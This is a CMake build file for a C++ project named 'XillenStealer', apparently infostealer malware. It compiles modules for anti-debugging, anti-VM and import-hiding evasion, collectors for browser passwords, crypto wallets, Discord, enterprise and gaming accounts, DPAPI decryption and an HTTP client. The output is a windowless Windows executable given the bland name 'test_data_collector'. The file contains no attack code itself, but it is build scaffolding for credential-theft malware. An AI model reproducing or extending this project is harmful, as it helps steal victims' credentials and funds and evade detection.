cmake_minimum_required(VERSION 3.15)
project(XillenStealer VERSION 5.0)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

if(WIN32)
    add_link_options(/ENTRY:mainCRTStartup)
    add_link_options(/SUBSYSTEM:WINDOWS)
endif()

if(MSVC)
    add_compile_options(/O2 /GL)
    add_link_options(/LTCG)
else()
    add_compile_options(-O3 -flto)
endif()

set(SOURCES
    src/core/main.cpp
    src/core/stealer.cpp
    src/evasion/anti_debug.cpp
    src/evasion/anti_vm.cpp
    src/evasion/api_hammering.cpp
    src/evasion/import_hiding.cpp
    src/evasion/runtime_decrypt.cpp
    src/collectors/browser_collector.cpp
    src/collectors/wallet_collector.cpp
    src/collectors/app_collector.cpp
    src/collectors/discord_collector.cpp
    src/collectors/enterprise_collector.cpp
    src/collectors/file_grabber.cpp
    src/collectors/gaming_collector.cpp
    src/collectors/browser_decryptor.cpp
    src/crypto/aes.cpp
    src/crypto/dpapi.cpp
    src/crypto/hash.cpp
    src/crypto/chacha20.cpp
    src/memory/memory_archive.cpp
    src/memory/memory_encrypt.cpp
    src/memory/secure_delete.cpp
    src/utils/http_client.cpp
    src/utils/json_builder.cpp
    src/utils/mutex.cpp
    src/external/sqlite3.c
)

add_executable(test_data_collector ${SOURCES})

target_link_libraries(test_data_collector 
    wininet
    winhttp
    crypt32
    iphlpapi
    psapi
    shell32
    shlwapi
)

if(MSVC)
    target_compile_options(test_data_collector PRIVATE /W3)
else()
    target_compile_options(test_data_collector PRIVATE -Wall -Wextra)
endif()
